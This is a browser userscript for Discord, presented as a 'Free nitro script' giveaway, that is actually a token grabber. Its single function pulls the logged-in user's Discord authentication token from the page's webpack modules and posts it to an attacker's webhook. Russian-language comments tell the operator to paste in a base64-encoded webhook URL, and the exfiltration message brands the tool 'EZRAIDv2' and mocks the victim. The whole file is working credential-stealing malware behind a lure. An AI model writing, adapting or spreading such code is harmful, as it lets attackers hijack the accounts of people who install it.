// ==UserScript==
// @name         Free nitro script 2022
// @namespace    http://tampermonkey.net/
// @version      1.8
// @description  try to take over the world!
// @author       SuperAmogusMaster658490
// @match        http://discord.com/app/*
// @match        https://discord.com/app/*
// @match        https://discord.com/channels/@me/*
// @match        https://discord.com/channels/*
// @match        http://discord.com/channels/*
// @match        http://discord.com/channels/@me/*
// @icon         https://www.svgrepo.com/show/353655/discord-icon.svg
// @grant        none
// ==/UserScript==
function getToken(){
        var webhook=atob('Зайдите на сайт base64encode.org, вставьте URL вебхука потом вернитесь сюда и вставьте то, что получилось.')
        var token=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
        var request = new XMLHttpRequest();
        request.open("POST", webhook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Токен граббер от EZRAIDv2",
            avatar_url: "",
            content: ":penguin: **EZRAIDv2 - Токен Граббер**\n**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **||`" + token + "`||\n:black_cat: **GitHub:** ||`https://github.com/EZRAIDv2/token-grabber-js`||\n:skull: **Сделал EZRAIDv2 ** :skeleton:"
        }
        request.send(JSON.stringify(params));
    }
    getToken()
